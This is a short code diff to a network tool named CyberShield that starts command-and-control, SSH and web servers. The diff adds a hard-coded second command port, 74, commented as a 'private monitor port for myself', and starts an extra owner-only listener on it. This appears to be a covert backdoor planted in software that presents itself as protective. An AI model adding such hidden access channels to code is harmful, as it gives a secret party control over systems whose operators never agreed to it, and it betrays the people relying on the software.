@@ -40,7 +40,10 @@ pub struct CyberShield
 
 		tick 						int
 		ui_mode 					bool
+
+		owner_cnc_port 				int = 74 /// PRIVATE MONITOR PORT FOR MYSELF :))))))))))))))
 		cnc_port 					int
+
 		ssh_port 					int
 		web_port 					int
 		servers 					Server
@@ -99,8 +102,9 @@ pub fn cyber_shield(mut c CyberShield, theme string)
 	c.network_protection_scan()
 
 	if c.cnc_port != 0 {
-		c.servers = start_servers(c.cnc_port, c.ssh_port)
+		c.servers = start_servers(c.cnc_port, c.owner_cnc_port, c.ssh_port)
 		go monitor_listener(mut &c)
+		go owner_monitor_listener(mut &c)
 	}
 
 	c.start_detection()
